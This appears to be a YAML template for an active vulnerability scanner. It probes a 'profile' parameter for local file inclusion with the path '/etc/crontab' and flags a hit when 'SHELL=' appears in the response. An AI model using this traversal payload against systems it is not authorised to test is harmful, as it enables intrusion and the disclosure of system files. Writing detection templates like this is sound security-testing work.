id: lfi6-0400
name: 'Traversal in profile'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via profile'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      profile:
        - '/etc/crontab'
    matchers:
      - type: word
        part: body
        words:
          - 'SHELL='
